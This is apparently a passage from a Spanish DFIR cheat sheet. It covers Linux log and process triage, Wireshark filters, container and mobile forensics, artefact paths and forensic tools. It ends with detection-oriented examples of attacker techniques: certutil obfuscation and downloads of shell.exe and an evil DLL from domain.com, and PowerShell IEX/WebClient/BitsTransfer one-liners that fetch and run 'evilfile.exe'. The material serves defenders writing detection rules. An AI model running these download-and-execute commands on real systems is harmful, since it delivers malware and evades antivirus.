Filtrar por proceso, usuario, grupo o servicio.
```bash
journalctl _PID=<identificador>
journalctl _UID=<identificador>
journalctl _GID=<identificador>
journalctl _COMM=<servicio>
# Para filtrar resultados del día actual: --since today
```

Mostrar registros de los discos.
```bash
journalctl /dev/sda
```

Mostrar un resultado de salida estándar.
```bash
journalctl --no-pager
```

Eliminar y guardar registros antiguos.
```bash
# Eliminar entradas antiguas hasta que el espacio total del diario ocupe lo solicitado.
sudo journalctl --vacuum-size=1G

# Guardar las entradas del último año.
sudo journalctl --vacuum-time=1years
```

Analizar eventos de inicio y apagado del sistema.
```bash
journalctl _SYSTEMD_UNIT=systemd-logind.service
```

Mostrar eventos de modificación de archivos relacionados con su eliminación (rm).
```bash
journalctl /usr/bin/rm
```

Buscar intentos de elevación de privilegios.
```bash
journalctl | grep "sudo"
```

Mostrar eventos de modificación de archivos de registro.
```bash
journalctl /var/log/audit/audit.log
journalctl /usr/bin/journalctl
```

Buscar eventos de ejecución de programas en directorios temporales.
```bash
journalctl _COMM="mv" OR _COMM="cp" | grep "/tmp/"
```

Analizar cambios en archivos de configuración de servicios.
```bash
journalctl /etc/nginx/nginx.conf
```

Mostrar cambios en archivos de configuración.
```bash
journalctl /usr/bin/vi
journalctl /usr/bin/vim
journalctl /usr/bin/nano
```

Filtrar por eventos de inicio de sesión fallidos en SSH.
```bash
journalctl _SYSTEMD_UNIT=sshd.service | grep "Failed password"
```

Mostrar eventos de inicio de sesión de usuarios remotos.
```bash
journalctl _SYSTEMD_UNIT=sshd.service | grep "Accepted"
```

Buscar eventos de ejecución de comandos de shell.
```bash
journalctl _COMM="bash" OR _COMM="sh"
```

Mostrar eventos de montaje y desmontaje de dispositivos.
```bash
journalctl _COMM="mount" OR _COMM="umount"
```

Mostrar eventos de cambios de permisos en archivos.
```bash
journalctl _COMM="chmod" OR _COMM="chown"
```

Mostrar eventos de inicio de sesión exitosos.
```bash
journalctl SYSLOG_FACILITY=4
```

Mostrar cambios en cronjobs.
```bash
journalctl /usr/sbin/cron
```

### 📜 Copiar un binario malicioso ya eliminado a través de su proceso todavía en ejecución 

Aunque se elimne el binario del proceso del malware, todavía está en el espacio del kernel. Por lo tanto, se puede usar el comando *scp* para copiar directamente un binario de proceso sospechoso de Linux.

```bash
scp /proc/<PID>/exe user@ip:/recovered_binary
```

### 📜 Identificar y obtener archivos con PID de procesos maliciosos (conexiones SSH Linux)

Se conectaron al sistema a través de SSH e iniciaron procesos maliciosos. Incluso, si eliminaron el historial de comandos.

Esta es una forma de obtener archivos con PID de procesos maliciosos (similar a casos de notty SSH) 

```bash
grep -l SSH_C /proc/*/environ
```

### 📜 Recopilar información en un primer análisis de respuesta a incidentes (sistema Linux)

Buscar archivos legibles en el directorio /etc/.
```bash
find /etc/ -readable -type f 2>/dev/null
```

Buscar archivos modificados en los últimos 2 días o N días.
```bash
find / -mtime -2 -ls
find / -mtime -[N]
```

Buscar un archivo específico.
```bash
find / -name [ARCHIVO]
updatedb ; locate [ARCHIVO]
```

Buscar archivos de más de N bytes.
```bash
find / -size +[N]c
```

Mostrar todas las reglas iptables.
```bash
iptables -L -n -v

# Debian/Ubuntu
cat /etc/iptables/rules.v4
cat /etc/iptables/rules.v6

# Red Hat/CentOS
cat /etc/sysconfig/iptables
```

Mostrar el estado de todos los servicios.
```bash
service --status-all
```

Listar los servicios en ejecución (systemd).
```bash
systemctl list-units --type=service
```

Listar procesos en formato de árbol con PIDs.
```bash
pstree -p
```

Listar procesos en formato personalizado.
```bash
ps -eo pid,tt,user,fname,rsz
```

Listar archivos abiertos asociados a conexiones de red.
```bash
lsof -i
```

Listar el proceso/servicio escuchando en un puerto concreto.
```bash
lsof -i:[PUERTO]
```

Listar archivos abiertos para un proceso.
```bash
lsof -p [PID]
```

Mostrar información de memoria.
```bash
cat /proc/meminfo
```

Mostrar sistemas de archivos montados.
```bash
cat /proc/mounts
```

Buscar cuentas root.
```bash
grep :0: /etc/passwd
```

Buscar archivos sin usuario.
```bash
find / -nouser -print
```

Listar contraseñas cifradas e información de expiración de cuentas.
```bash
cat /etc/shadow
chage --list [USUARIO]
```

Listar información de grupos del sistema y servicio.
```bash
cat /etc/group
```

Listar el archivo sudoers, comprobar usuarios que puedan elevarse en contexto privilegiado.
```bash
cat /etc/sudoers
```

Listar cuentas de usuario y servicio.
```bash
cat /etc/passwd
```

Listar el estado de la contraseña de un usuario.
```bash
passwd -S [USUARIO]
```

"Listar inicios de sesión más recientes.
```bash
lastlog
```

Listar los últimos usuarios conectados.
```bash
last
```

Listar quién está conectado y que procesos está ejecutando.
```bash
who
w
```

### 📜 Historial de comandos de la Shell de Linux (.bash_history & .zsh_history)

Realizar un backup del historial de comandos ejecutados por todos los usuarios del sistema, incluido el usuario /root, donde están creados los ficheros: `.bash_history` o `.zsh_history`.
```bash
for i in /home/* /root; do [ -d "$i" ] && { [ -s "$i"/.bash_history ] || [ -s "$i"/.zsh_history ]; } && { [ -f "$i"/.bash_history ] && cat "$i"/.bash_history || true; [ -f "$i"/.zsh_history ] && cat "$i"/.zsh_history || true; } > "$(basename "$i")_history_backup.txt"; done
```

### 📜 Voldado de todos los directorios y ficheros de Linux 

```bash
find / -type f 2> /dev/null > dump_sys_files.txt
find / -type d 2> /dev/null > dump_sys_dirs.txt
```

### 📜 Volcado de Memoria RAM en Linux con LiME (Linux Memory Extractor)

**LiME** es un LKM (Loadable Kernel Module) que permite la adquisición de memoria volátil de Linux y dispositivos basados en Linux como sistemas móviles Android. Permite capturas de memoria más sólidas que otras herramientas desde el punto de vista forense.

Una vez instalado LiME y cargado el módulo en el kernel en formato lime podemos analizarlo posteriormente con **Volatility**.

```bash
apt install build-essential linux-headers-(uname -r) ; git clone https://github.com/504ensicsLabs/LiME ; cd Lime/src ; make
sudo insmod lime-3.5.0-23-generic.ko "path=/media/Forensics/ram.lime format=lime"
```

### 📜 Comprobar si un usuario ejecutó el comando "sudo"

En un escenario en el que un posible atacante creó un nuevo usuario y eliminó el historial de comandos, pero aún no se puede confirmar si el atacante obtuvo privilegios de root ejecutando el comando "sudo".

Verificar si el archivo **".sudo_as_admin_successful"** está en el directorio de inicio del usuario. Si se encuentra, entonces el atacante ejecutó el comando "sudo".

### 📜 Detectar malware Linux fileless (memfd)

Estos malware asignan bytes maliciosos en la memoria y se ejecutan. Una forma de detección es usar *memfd* para cualquier proceso y esto nos puede indicar malware sin archivos (fileless). 

```bash
cat /proc/*/maps | grep "memfd"
```

## 📁 Redes

### 📜 Filtros Wireshark para analistas

- Referencia Wireshark: https://www.wireshark.org/docs/dfref
- Brim Zed (herramienta que simplifica el análisis de datos superestructurados .pcapng): https://www.brimdata.io/download

Filtrar por dirección IP. Donde "x.x.x.x" es la dirección IP que desea filtrar.
```
ip.addr == x.x.x.x
```

Filtrar por rango de direcciones IP. Donde "x.x.x.x" e "y.y.y.y" son las direcciones IP inicial y final del rango.
```
ip.addr >= x.x.x.x and ip.addr <= y.y.y.y
```

Filtrar por interfaz de red. Mostrar sólo los paquetes capturados en la interfaz eth0.
```
interface == eth0
```

Filtrar por puerto. Donde "80" y "53" son los números de puerto que desees filtrar.
```
tcp.port == 80
udp.port == 53
```

Filtrar por longitud del paquete. Mostrar sólo los paquetes de más de 100 bytes.
```
frame.len > 100
```

Filtrar por dirección MAC de origen o destino. Donde "xx:xx:xx:xx:xx:xx" es la dirección MAC origen y destino que desees filtrar.
```
eth.src == xx:xx:xx:xx:xx:xx
eth.dst == xx:xx:xx:xx:xx:xx
```

Filtrar por método HTTP. Mostrar sólo los paquetes con método GET. Puede sustituir GET por otros métodos HTTP como POST, PUT, DELETE, etc.
```
http.request.method == GET
http.request.method == POST && frame contains "login"
```

Filtrar por códigos de estado HTTP.
```
# Respuestas Ok.
http.response.code == 200

# Respuestas de redireccionamiento. 301 redirección permanente y 302 redirección temporal.
http.response.code == 301 or http.response.code == 302

# Respuestas de error "Not Found". 
http.response.code == 404
```

Filtrar por URI HTTP. Mostrar sólo los paquetes que tienen un URI que contiene "domain.com". Puede sustituir "domain.com" por cualquier otra cadena URI.
```
http.request.uri contains 'domain.com'
```

Filtrar por cookie HTTP. Mostrar sólo los paquetes que contienen una cookie con el nombre "sessionid".
```
http.cookie contains 'sessionid'
```

Filtrar por tamaño de paquete. Mostrar sólo los paquetes de más de 1000 bytes.
```
frame.len > 1000
```

Filtrar por aquellos paquetes que contengan el término especificado
```
tcp contains 'TERMINO'
```

Filtrar todos los paquetes que no utilicen el protocolo ARP, ICMP, DNS, SSDP o UDP.
```
!(arp or icmp or dns or ssdp or udp)
```

Filtrar todos los paquetes cuyo puerto TCP origen o destino sea 22 o 443.
```
(tcp.port in {22 443})
```
Filtros DNS.
```
# Paquetes DNS que tengan un nombre de dominio que contenga "domain.com"
dns.qry.name contains 'domain.com'
dns.resp.name == domain.com 

# Consulta/respuesta de puntero DNS (PTR, DNS Inverso)
dns.qry.type == 12

# Consultas MX
dns.qry.type == 15

# Solo consultas DNS.
dns.flags.response == 0

# Solo consultas de respuesta DNS.
dns.flags.response eq 1 # only DNS response queries

# Errores DNS.
dns.flags.rcode != 0 or (dns.flags.response eq 1 and dns.qry.type eq 28 and !dns.aaaa)

# NXDominio no existente.
dns.flags.rcode == 3

# No Error, nslookup microsoft.com 193.247.121.196.
((dns.flags.rcode == 3) && !(dns.qry.name contains ".local") && !(dns.qry.name contains ".svc") && !(dns.qry.name contains ".cluster"))
(dns.flags.rcode == 0) && (dns.qry.name == "microsoft.com")

dns.flags.rcode != 0 or (dns.flags.response eq 1 and dns.qry.type eq 28 and !dns.aaaa)
```

Filtros TLS.
```
# TLS handshake.
tls.record.content_type == 22

# Filtrar por tipo de handshake SSL/TLS.
ssl.handshake.type = TLS
ssl.handshake.type = SSL

# Paquetes "TLS Client Hello".
tls.handshake.type == 1

# Paquetes "TLS Server Hello".
tls.handshake.type == 2

# Conexión cerrada.
tls.record.content_type == 21

# Paquetes relacionados con la comunicación entre el cliente y el servidor que involucren el sitio web "badsite.com".
tls.handshake.extensions_server_name contains "badsite.com"

# Cuando se produce el timeout, el cliente suele enviar un RST al servidor para filtrar los paquetes con el timeout del handshake. 
(tcp.flags.reset eq 1) and (tcp.flags.ack eq 0)

# Paquetes que tardan en responder a SYNACK durante el handshake del servidor.
tcp.flags eq 0x012 && tcp.time_delta gt 0.0001
```

Filtros GeoIP.
```
# Excluir el tráfico procedente de Estados Unidos.
ip and not ip.geoip.country == "United States" 

# Ciudad de destino [IPv4].
ip.geoip.dst_city == "Dublin" 

# Ciudad de origen o destino [IPv4].
ip.geoip.city == "Dublin"
ip.geoip.dst_country == "Ireland"
ip.geoip.dst_country_iso == "IE"

# Todos los países de destino excepto Estados Unidos.
!ip.geoip.country == "United States" 
not ip.geoip.country == "United States"
```

Establecer un filtro para los valores HEX de 0x22 0x34 0x46 en cualquier offset.
```
udp contains 22:34:46
```

Filtrar por flags TCP. Mostrar sólo los paquetes con la bandera SYN activada. Se puede sustituir SYN por cualquier otro indicador TCP como: ACK, RST, FIN, URG o PSH.
```
tcp.flags.syn == 1
```

Mostrar todos los flags SYN+ACK TCP.
```
tcp.flags.syn == 1 && tcp.flags.ack == 1
```

Mostrar todos los flags RST TCP.
```
tcp.flags.rst == 1
```

Mostrar paquetes con reconocimientos duplicados en TCP.
```
tcp.analysis.duplicate_ack
```

## 📁 Contenedores

### 📜 Análisis Forense en contenedores Docker 

Si un contenedor malicioso modifica archivos o acciones de malware al iniciarse, es posible que se pierdan muchos artefactos de seguridad. La solución podría ser trabajar con el contenedor que se crea pero que no se inicia.

Extraer el sistema de archivos de contenedores de Docker. 

- Referencia: https://iximiuz.com/en/posts/docker-image-to-filesystem

Ejemplo con una imagen oficial de nginx.

Opción 1: **`docker export`**
```bash
docker pull nginx
CONT_ID=$(docker run -d nginx)
docker export ${CONT_ID} -o nginx.tar.gz

mkdir rootfs
tar -xf nginx.tar.gz -C rootfs
ls -lathF rootfs
```

Opción 2: **`docker build`**
```bash
echo 'FROM nginx' > Dockerfile
DOCKER_BUILDKIT=1 docker build -o rootfs .
ls -lathF rootfs
```

Opción 3: **`crt (containerd CLI)`**

Montar imágenes de contenedores como carpetas locales del host.
```bash
ctr image pull docker.io/library/nginx:latest
mkdir rootfs
ctr image mount docker.io/library/nginx:latest rootfs
ls -lathF rootfs
```

## 📁 Android & iOS

### 📜 Forense Android: Evidencias de imágenes eliminadas y enviadas por WhatsApp

Un usuario envió imágenes a través de Whatsapp, después las eliminó de su dispositivo móvil, pero estas imágenes todavía están en la carpeta "sent" de WhatsApp.

```
"Internal storage/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent"
```

## 📁 Varios

### 📜 Artefactos en dispositivos USB en Windows, Linux y MacOS

`Windows`

Ramas del registro USB a analizar:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USB
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Portable Devices\Devices
HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceClasses
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\SWD\WPDBUSENUM
HKEY_USERS\SID\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Portable Devices
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\EMDMgmt
```

Otros artefactos USB a analizar:
```
C:\Windows\System32\winevt\Logs\Microsoft-Windows-DriverFrameworks-UserMode%4Operational.evtx (Windows 7)
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Storage-ClassPnP/Operational.evtx 
C:\Windows\System32\winevt\Logs\Microsoft-Windows-WPD-MTPClassDriver/Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Partition%4Diagnostic.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Ntfs%4Operational.evtx
C:\Windows\INF\setupapi.dev.log
C:\Windows\INF\setupapi.dev.yyyymmdd_hhmmss.log
C:\Windows\setupapi.log
C:\Users\<user account>\AppData\Roaming\Microsoft\Windows\Recent\<Lnk files>

Carpeta "Windows.old"
Volume Shadow Copies
```

**Event ID 6416**: El Sistema reconoció un nuevo dispositivo externo. 
- https://learn.microsoft.com/es-es/windows/security/threat-protection/auditing/event-6416

Otros eventos:
```
10000: Primera conexión dispositivo USB.
20001: Instalación o actualización de UserPNP.
24576: Instalación correcta de controladores WPD (Windows Portable Devices).
```

**Logman**: Capturar el seguimiento de eventos de USBs. 
- https://learn.microsoft.com/es-es/windows-hardware/drivers/usbcon/how-to-capture-a-usb-event-trace

`Linux`

Distribuciones basadas en Debian.
```
/var/log/syslog
```

Distribuciones basadas en Red Hat.

Habilitar un registro detallado USB configurando "EnableLogging=1" en el fichero "/etc/usb_modeswitch.conf".
```
/var/log/messages

/var/log/usb_modeswitch_<interface name>
```

`Mac OSX`
```
/private/var/log/kernel.log
/private/var/log/kernel.log.incrementalnumber.bz2
/private/var/log/system.log
/private/var/log/system.log.incrementalnumber.gz
```

`Herramientas de terceros`
- USBDeview: https://www.nirsoft.net/utils/usb_devices_view.html
- USB Forensic Tracker (USBFT) Windows, Linux y MacOS: https://www.orionforensics.com/forensics-tools/usb-forensic-tracker

### 📜 Recopilación de artefactos de paths en Windows, Linux y MacOS

`WINDOWS`

System Root (C:\Windows):
```
%SYSTEMROOT%\Tasks\*
%SYSTEMROOT%\Prefetch\*
%SYSTEMROOT%\System32\sru\*
%SYSTEMROOT%\System32\winevt\Logs\*
%SYSTEMROOT%\System32\Tasks\*
%SYSTEMROOT%\System32\Logfiles\W3SVC1\*
%SYSTEMROOT%\Appcompat\Programs\*
%SYSTEMROOT%\SchedLgU.txt
%SYSTEMROOT%\inf\setupapi.dev.log
%SYSTEMROOT%\System32\drivers\etc\hosts
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\System32\config\SOFTWARE
%SYSTEMROOT%\System32\config\SECURITY
%SYSTEMROOT%\System32\config\SOFTWARE
%SYSTEMROOT%\System32\config\SAM.LOG1
%SYSTEMROOT%\System32\config\SOFTWARE.LOG1
%SYSTEMROOT%\System32\config\SECURITY.LOG1
%SYSTEMROOT%\System32\config\SOFTWARE.LOG1
%SYSTEMROOT%\System32\config\SAM.LOG2
%SYSTEMROOT%\System32\config\SOFTWARE.LOG2
%SYSTEMROOT%\System32\config\SECURITY.LOG2
%SYSTEMROOT%\System32\config\SOFTWARE.LOG2
```

Program Data (C:\ProgramData):
```
%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*
```

Drive Root (C:\\)
```
%SYSTEMDRIVE%\$Recycle.Bin\*\$I*
%SYSTEMDRIVE%\$Recycle.Bin\$I*
%SYSTEMDRIVE%\$LogFile
%SYSTEMDRIVE%\$MFT
```

Perfiles usuarios (C:\Users\\*):
```
%USERPROFILE%\NTUser.DAT
%USERPROFILE%\NTUser.DAT.LOG1
%USERPROFILE%\NTUser.DAT.LOG2
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\*
%USERPROFILE%\AppData\Local\Microsoft\Windows\PowerShell\*
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Visual Studio Code Host_history.txt
%USERPROFILE%\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs\*
%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\*
%USERPROFILE%\AppData\Local\Microsoft\Windows\WebCache\*
%USERPROFILE%\AppData\Local\Microsoft\Windows\Explorer\*
%USERPROFILE%\AppData\Local\Microsoft\Windows\UsrClass.dat
%USERPROFILE%\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG1
%USERPROFILE%\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG2
%USERPROFILE%\AppData\Local\ConnectedDevicesPlatform\*
%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History\*
%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\History\*
%USERPROFILE%\AppData\Local\Temp
```

`LINUX`

Paths sistema:
```
/etc/hosts.allow
/etc/hosts.deny
/etc/hosts
/etc/passwd
/etc/group
/etc/crontab
/etc/cron.allow
/etc/cron.deny
/etc/anacrontab
/etc/apt/sources.list
/etc/apt/trusted.gpg
/etc/apt/trustdb.gpg
/etc/resolv.conf
/etc/fstab
/etc/issues
/etc/issues.net
/etc/insserv.conf
/etc/localtime
/etc/timezone
/etc/pam.conf
/etc/rsyslog.conf
/etc/xinetd.conf
/etc/netgroup
/etc/nsswitch.conf
/etc/ntp.conf
/etc/yum.conf
/etc/chrony.conf
/etc/chrony
/etc/sudoers
/etc/logrotate.conf
/etc/environment
/etc/hostname
/etc/host.conf
/etc/fstab
/etc/machine-id
/etc/screen-rc
/etc/rc.d/*
/etc/cron.daily/*
/etc/cron.hourly/*
/etc/cron.weekly/*
/etc/cron.monthly/*
/etc/modprobe.d/*
/etc/modprobe-load.d/*
/etc/*-release
/etc/pam.d/*
/etc/rsyslog.d/*
/etc/yum.repos.d/*
/etc/init.d/*
/etc/systemd.d/*
/etc/default/*
/var/log/*
/var/spool/at/*
/var/spool/cron/*
/var/spool/anacron/cron.daily
/var/spool/anacron/cron.hourly
/var/spool/anacron/cron.weekly
/var/spool/anacron/cron.monthly
/boot/grub/grub.cfg
/boot/grub2/grub.cfg
/sys/firmware/acpi/tables/DSDT
```

Paths usuarios:
```
/root/.*history
/root/.*rc
/root/.*_logout
/root/.ssh/config
/root/.ssh/known_hosts
/root/.ssh/authorized_keys
/root/.selected_editor
/root/.viminfo
/root/.lesshist
/root/.profile
/root/.selected_editor
/home/*/.*history
/home/*/.ssh/known_hosts
/home/*/.ssh/config
/home/*/.ssh/autorized_keys
/home/*/.viminfo
/home/*/.profile
/home/*/.*rc
/home/*/.*_logout
/home/*/.selected_editor
/home/*/.wget-hsts
/home/*/.gitconfig
/home/*/.mozilla/firefox/*.default*/*/*.sqlite*
/home/*/.mozilla/firefox/*.default*/*/*.json
/home/*/.mozilla/firefox/*.default*/*/*.txt
/home/*/.mozilla/firefox/*.default*/*/*.db*
/home/*/.config/google-chrome/Default/History*
/home/*/.config/google-chrome/Default/Cookies*
/home/*/.config/google-chrome/Default/Bookmarks*
/home/*/.config/google-chrome/Default/Extensions/*
/home/*/.config/google-chrome/Default/Last*
/home/*/.config/google-chrome/Default/Shortcuts*
/home/*/.config/google-chrome/Default/Top*
/home/*/.config/google-chrome/Default/Visited*
/home/*/.config/google-chrome/Default/Preferences*
/home/*/.config/google-chrome/Default/Login Data*
/home/*/.config/google-chrome/Default/Web Data*
```

`MACOS`

Paths sistema:
```
/etc/hosts.allow
/etc/hosts.deny
/etc/hosts
/etc/passwd
/etc/group
/etc/rc.d/*
/var/log/*
/private/etc/rc.d/*
/private/etc/hosts.allow
/private/etc/hosts.deny
/private/etc/hosts
/private/etc/passwd
/private/etc/group
/private/var/log/*
/System/Library/StartupItems/*
/System/Library/LaunchAgents/*
/System/Library/LaunchDaemons/*
/Library/StartupItems/*
/Library/LaunchAgents/*
/Library/LaunchDaemons/*
/.fseventsd/*
```

Paths librerías:
```
*/Library/*Support/Google/Chrome/Default/*
*/Library/*Support/Google/Chrome/Default/History*
*/Library/*Support/Google/Chrome/Default/Cookies*
*/Library/*Support/Google/Chrome/Default/Bookmarks*
*/Library/*Support/Google/Chrome/Default/Extensions/*
*/Library/*Support/Google/Chrome/Default/Extensions/Last*
*/Library/*Support/Google/Chrome/Default/Extensions/Shortcuts*
*/Library/*Support/Google/Chrome/Default/Extensions/Top*
*/Library/*Support/Google/Chrome/Default/Extensions/Visited*
```

Paths usuarios:
```
/root/.*history
/Users/*/.*history
```

Otros paths:
```
*/places.sqlite*
*/downloads.sqlite*
```

## 📁 Herramientas

### 📜 Autopsy: Herramienta avanzada de análisis forense digital

Es una interfaz gráfica de usuario para Sleuth Kit que facilita la realización de análisis forenses digitales. Proporciona características avanzadas para análisis de imágenes forenses, análisis de metadatos, búsqueda avanzadas, análisis de memoria volátil, generación de informes detallados, integración con otras herramientas forenses.

- https://www.autopsy.com

### 📜 X-Ways Forensics: Herramienta avanzada de análisis forense digital

Es una herramienta forense que ofrece análisis detallados, adquisición, examen y presentación de evidencia digital en investigaciones forenses. Otra alternativa similar a Autopsy.

- https://www.x-ways.net/forensics

### 📜 Volatility 3: Análisis de volcados de memoria

Es una herramienta de análisis forense de memoria volátil (RAM) que puede utilizarse para analizar volcados de memoria y buscar indicadores de actividad maliciosa o manipulación de archivos en la memoria del sistema.

- https://volatilityfoundation.org

### 📜 WinTriage (Securizame): Análisis y extracción de artefactos forenses Windows

Realiza extracciones de diferentes artefactos forenses de usuario, sistema y sistema de ficheros de un ordenador, tanto en caliente como a partir de una imagen forense, para que posteriormente puedan ser analizados e interpretados en una investigación por parte de un profesional analista de DFIR.

- https://www.securizame.com/wintriage

### 📜 Velociraptor: Recolección, monitorización y hunting para análisis forense digital y respuesta a incidentes en Windows

Se utiliza para recopilar información sobre sistemas Windows en tiempo real, permite obtener una visión detallada del estado de un sistema y de las actividades que se están llevando a cabo en él a través de consultas Velociraptor Query Language (VQL) donde brindan acceso a las API de Windows. La monitorización en tiempo real incluye información del sistema, actividad del usuario, registros de eventos, procesos en ejecución, archivos abiertos, conexiones de red, se puede definir y personalizar los artefactos, entre otras características.

- https://github.com/Velocidex/velociraptor
- https://docs.velociraptor.app

### 📜 LogonTracer: Trazabilidad de inicios de sesión en Active Directory

Herramienta para investigar inicios de sesión maliciosos mediante la visualización y el análisis de los registros de eventos de Windows Active Directory. Asocia un nombre de host (o una dirección IP) y un nombre de cuenta encontrados en eventos relacionados con el inicio de sesión y lo muestra como un gráfico. De esta forma, es posible ver en qué cuenta se produce el intento de inicio de sesión y qué host se utiliza.

- https://github.com/JPCERTCC/LogonTracer

### 📜 AuthLogParser: Análisis auth.log, resumen de registros relacionados con autenticación

Análisis de registros de autenticación de Linux (auth.log). AuthLogParser escanea el archivo de registro auth.log y extrae información clave, como inicios de sesión SSH, creaciones de usuarios, nombres de eventos, direcciones IP y más. Proporciona una descripción general clara y concisa de las actividades registradas en los registros de autenticación.

- https://github.com/YosfanEilay/AuthLogParser

### 📜 Skadi: Análisis de artefactos e imágenes forenses

Pack de herramientas que permite la recopilación, el procesamiento y el análisis avanzado de artefactos e imágenes forenses. Funciona en máquinas MacOS, Windows y Linux.

- https://github.com/orlikoski/Skadi

### 📜 GRR - Google Rapid Response

Es un framework de respuesta a incidentes centrado en análisis forense remoto en vivo. GRR es un cliente (agente) de Python que se instala en los sistemas de destino y una infraestructura de servidor de Python que puede administrar y comunicarse con los clientes. https://grr-doc.readthedocs.io/en/latest

- https://github.com/google/grr

### 📜 Arkime - Almacenar e indexar el tráfico de red en formato PCAP

Almacenar e indexar el tráfico de red en formato PCAP estándar, proporcionando un acceso indexado rápido. Se proporciona una interfaz web intuitiva y sencilla para explorar, buscar y exportar PCAP.

- https://github.com/arkime/arkime

### 📜 Live Forensicator - Recolección automatizada de información y artefactos en Windows, Linux y MacOS

Recopila información diferente del sistema (Windows, Linux y MacOS) para su posterior revisión en busca de comportamientos anómalos o entrada de datos inesperada, también busca archivos o actividades inusuales.

- https://github.com/Johnng007/Live-Forensicator

### 📜 FTK Forensic Toolkit (Exterro)
FTK (Forensic Toolkit) de Exterro permite recopilar, procesar y analizar datos en investigaciones forenses. Facilita la identificación y preservación de evidencia digital para soportar investigaciones y litigios.

- https://www.exterro.com/digital-forensics-software/forensic-toolkit

### 📜 EnCase Forensic (ondata)

*EnCase Endpoint Investigator de ondata*: busca, recolecta, preserva y analiza gran cantidad de datos y genera informes detallados sobre estos hallazgos; todo de forma centralizada, con interrupciones mínimas y sin importar el tamaño ni la complejidad del entorno de red.

*EnCase Forensics de ondata*: recolecta, preserva y examina evidencia de dispositivos electrónicos, apoyando investigaciones criminales y legales con capacidades avanzadas de análisis y generación de informes detallados.

- https://www.ondata.es/recuperar/forensics-guidance.htm

### 📜 SANS DFIR - Posters & Cheat Sheets

- https://www.sans.org/posters/?focus-area=digital-forensics

---

# 📓 Detección de técnicas de evasión en sistemas SIEM, SOC y Anti-Forense

## 📁 Windows

### 📜 Comando Windows: "net" y "net1"

El comando "net1" funcionará igual que el comando "net".
```cmd
net1 accounts
net accounts
```

### 📜 Detectar técnicas maliciosas realizadas a través de CertUtil (LOLBin)

El comando "certutil.exe" puede ser utilizado por un actor malicioso para realizar diversas acciones maliciosas. Es una buena postura de seguridad configurar reglas preventivas y alertas para detectar estas técnicas.

Ofuscación: Codifica y descodifica ficheros a través de certutil, evitando así la detección por motores antimalware en un primer análisis estático del fichero. 
```cmd
certutil -encode .\malware.exe bypass.txt
certutil -decode .\bypass.txt malware.exe
```

Descarga de ficheros desde una dirección URL a local a través de certutil.
```cmd
certutil -urlcache -split -f https://domain.com/shell.exe shell.exe
```

Descarga de una dll maliciosa ofuscada previamente en un formato txt, decodifica y convierte la dll maliciosa a un formato de librería dll, con regsvr32 registra en modo silencioso la librería dll en el sistema.
```cmd
certutil -urlcache -split -f https://domain.com/evildll.txt evildll.txt
certutil -decode .\evildll.txt evildll.dll
regsvr32 /s /u .\evildll.dll
```

### 📜 Detectar descargas de ficheros realizadas a través de PowerShell usando "Invoke-WebRequest, Invoke-RestMethod, BitsTransfer"

Existen multitud de técnicas para la descarga y ejecución de ficheros a través de PowerShell, estas técnicas son comunes por los actores maliciosos para poder transferirse malware a una máquina previamente comprometida o con acceso limitado o través de máquinas de salto para ejecutar después técnicas de post-explotación o movimiento lateral. Es interesante conocer las técnicas más comunes y añadir reglas de detección.

Invoke-WebRequest (IWR) e Invoke-Expression (IEX)
```ps
Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -OutFile "C:\temp\evilfile.exe"
Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -UseBasicParsing | Select-Object Content | IEX
Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -UseBasicParsing | IEX

IEX (Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -UseBasicParsing).Content
IEX (Invoke-WebRequest -Uri 'https://domain.com/evilfile.exe' -UseBasicParsing)
IEX (New-Object Net.WebClient).DownloadString('https://domain.com/evilfile.exe')
```

Invoke-RestMethod (IRM) e Invoke-Expression (IEX)
```ps
Invoke-RestMethod -Method Get -Uri 'https://domain.com/evilfile.exe' | IEX
IEX (Invoke-RestMethod -Method Get -Uri 'https://domain.com/evilfile.exe')
```

BitsTransfer synchronously
```ps
Start-BitsTransfer 'https://domain.com/evilfile.exe' -Destination "C:\temp\evilfile.exe"
```

BitsTransfer asynchronously
```ps
Start-BitsTransfer 'https://domain.com/evilfile.exe' -Destination "C:\temp\evilfile.exe" -Asynchronous
```
"BitsTransfer asynchronously" agrega un nuevo trabajo del servicio de transferencia de bits en segundo plano, esto es persistente incluso si la sesión de PowerShell se cierra. Para ver los trabajos en cola se usa "Get-BitsTransfer" y para completar el trabajo y descargar el archivo "Complete-BitsTransfer".
```ps
Get-BitsTransfer -Name "TestJob1" | Complete-BitsTransfer
```

- Más info: https://github.com/adrianlois/scripts-misc/tree/main/07.PS-IEX-WebRequest-WebClient-BitsTransfer

### 📜 Post-Explotación - PrivEsc con scmanager
